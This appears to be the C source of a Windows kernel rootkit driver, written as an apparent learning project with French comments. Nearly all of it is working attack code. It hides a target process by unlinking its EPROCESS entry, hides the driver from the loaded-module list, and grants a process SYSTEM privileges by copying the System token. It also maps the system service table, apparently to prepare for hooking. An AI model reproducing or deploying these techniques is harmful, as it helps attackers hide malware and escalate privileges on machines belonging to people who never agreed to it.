#include "Driver.h"





void OnUnload(IN PDRIVER_OBJECT DriverObject) {
    DbgPrintEx(0, 0, "Bye Bye !!!\n");
}
//https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/ps/eprocess/index.htm
// 
//Windows ActiveProcessLinks offset:0x448
//Windows Flink offset:0x0
//Windows Blink offset:0x8

int GetImageFileNameOffset(char* name) {
    PEPROCESS currentproc = PsGetCurrentProcess();
    for (int i = 0; i < PAGE_SIZE; i++)
    {

        if (strncmp(name, (char*)currentproc + i, strlen(name))==0){
            return i;
        }
    }
    DbgPrintEx(0, 0, "Process not found...\n");
    return -1;
}
int SearchAndRemoveEPROCESSbyOffset(int offset, char *target) {
    PEPROCESS currentproc = PsGetCurrentProcess();
    DbgPrintEx(0, 0, "ImageFileName: %s\n", (unsigned char*)((unsigned char*)currentproc + offset));
    PLIST_ENTRY listentry = (LIST_ENTRY*)((unsigned char*)currentproc+0x448);
    listentry = listentry->Flink;
    PEPROCESS process = (PEPROCESS)((unsigned char*)listentry - 0x448);//getting EPROCESS from LIST_ENTRY
    char *name = (char*)((unsigned char*)process + offset);

    while (strcmp(name, "System") != 0){
        
        process = (PEPROCESS)((unsigned char*)listentry - 0x448);//getting EPROCESS from LIST_ENTRY
        name = (char*)((unsigned char*)process + offset);
        DbgPrintEx(0, 0, "Process name: %s\n", name);
        listentry = listentry->Flink;
        if (strcmp(name, target) == 0) {
            int pid = *(int*)((unsigned char*)process + 0x440);
            HideProcess(pid);
            //*(int*)((unsigned char*)process + 0x440) = 0xffffcafe;//is this illegal ?
            DbgPrintEx(0, 0, "PID : %d\n", pid);
        }
    }

    return -1;
}
int HideProcess(int targetPID) {
    PEPROCESS pidEPROCESS;
    NTSTATUS result = PsLookupProcessByProcessId((HANDLE)targetPID,&pidEPROCESS);
    
    if (result == STATUS_INVALID_PARAMETER) {
        DbgPrint("An invalid parameter was passed to a service or function. (PID not found) (0xC000000D)");
        return -1;
    }
    else if (result == STATUS_INVALID_CID) {
        DbgPrint("An invalid client ID was specified. (0x0xC000000B)");
        return -1;
    }
    if (result != STATUS_SUCCESS) {
        DbgPrint("Unknow PsLookupProcessByProcessId error !!!");
    }
    PLIST_ENTRY ActiveProcessLinks;
    ActiveProcessLinks = (PLIST_ENTRY)((unsigned char *)pidEPROCESS + 0x448);
    ActiveProcessLinks->Flink->Blink = ActiveProcessLinks->Blink;
    ActiveProcessLinks->Blink->Flink = ActiveProcessLinks->Flink;
    ActiveProcessLinks->Flink = NULL;
    ActiveProcessLinks->Blink = NULL;

    //now hiding the process
    DbgPrint("Process is now hidden..."); 
    return 1;
}

int HideDriverSection(PDRIVER_OBJECT DriverObject) {
    PVOID DriverSection = DriverObject->DriverSection;
    PLDR_DATA_TABLE_ENTRY TableEntry  = (PLDR_DATA_TABLE_ENTRY)DriverSection;
    DbgPrintEx(0, 0, "DriverSection: %p\n", DriverSection);
    PLIST_ENTRY InLoadOrderLinks_ = (PLIST_ENTRY)((unsigned char*)TableEntry + 0);//current offset of InLoadOrderLinks
    PUNICODE_STRING FullDllName = (UNICODE_STRING*)((unsigned char*)InLoadOrderLinks_ + 0x48);
    DbgPrintEx(0, 0, "InLoadOrderLinks FullDllName: %ls\n", FullDllName->Buffer);
    PLDR_DATA_TABLE_ENTRY PrevEntry = (PLDR_DATA_TABLE_ENTRY)TableEntry->InLoadOrderLinks.Blink;
    PLDR_DATA_TABLE_ENTRY NextEntry = (PLDR_DATA_TABLE_ENTRY)TableEntry->InLoadOrderLinks.Flink;
    PrevEntry->InLoadOrderLinks.Flink = TableEntry->InLoadOrderLinks.Flink;
    NextEntry->InLoadOrderLinks.Blink = TableEntry->InLoadOrderLinks.Blink;
    TableEntry->InLoadOrderLinks.Flink = NULL;
    TableEntry->InLoadOrderLinks.Blink = NULL;
    DbgPrintEx(0, 0, "Driver should be hidden\n");
    return 1;
}

int ElevateSpecificPID(int targetPID) {
    PEPROCESS currentproc = PsGetCurrentProcess();//System
    PEX_FAST_REF Token = (PEX_FAST_REF)((unsigned char*)currentproc + 0x4B8);//Token offset
    PEPROCESS pidEPROCESS;
    NTSTATUS result = PsLookupProcessByProcessId((HANDLE)targetPID, &pidEPROCESS);

    if (result == STATUS_INVALID_PARAMETER) {
        DbgPrint("An invalid parameter was passed to a service or function. (PID not found) (0xC000000D)");
        return -1;
    }
    else if (result == STATUS_INVALID_CID) {
        DbgPrint("An invalid client ID was specified. (0x0xC000000B)");
        return -1;
    }
    if (result != STATUS_SUCCESS) {
        DbgPrint("Unknow PsLookupProcessByProcessId error !!!");
    }
    memcpy(((unsigned char*)pidEPROCESS + 0x4B8), Token, sizeof(PEX_FAST_REF));//normalement ça passe
    //du 1er coup si ça c'est pas beau
    return 0;
}


//https://www.geoffchappell.com/studies/windows/km/ntoskrnl/api/index.htm

typedef struct SystemServiceDescriptorTable {
    void* ServiceTableBase;
    void* ServiceCounterTableBase;
    unsigned int          NumberOfServices;
    unsigned char* ParamTableBase;
} SSDT;

unsigned long* g_pMappedSCT;
MDL* g_pMdlSCT;//init memory descriptor list



SSDT KeServiceDescriptorTable;

int ssdt_init()
{
    g_pMdlSCT = IoAllocateMdl(KeServiceDescriptorTable.ServiceTableBase,KeServiceDescriptorTable.NumberOfServices * 4,FALSE, FALSE, NULL);
    if (!g_pMdlSCT)
    {
        DbgPrintEx(0, 0, "MDL not allocated...\n");
        return -1;
    }

    MmBuildMdlForNonPagedPool(g_pMdlSCT);

    g_pMdlSCT->MdlFlags |= MDL_MAPPED_TO_SYSTEM_VA;

    g_pMappedSCT = MmMapLockedPagesSpecifyCache(g_pMdlSCT, KernelMode, MmNonCached, NULL, FALSE, HighPagePriority);


    return 1;

}

NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject,_In_ PUNICODE_STRING RegistryPath){
    // NTSTATUS variable to record success or failure
    DbgPrintEx(0, 0, "Hey from kernel ! now testing...\n");
    DriverObject->DriverUnload = OnUnload;
    //SearchAndRemoveEPROCESSbyOffset("pwnme.exe");
    //SearchAndRemoveEPROCESSbyOffset(GetImageFileNameOffset("System"), "pwnme.exe");
    //HideDriverSection(DriverObject);
    if (ssdt_init() == 1) {
        DbgPrintEx(0, 0, "Ouais c'est greg\n");
    }
    return STATUS_SUCCESS;
}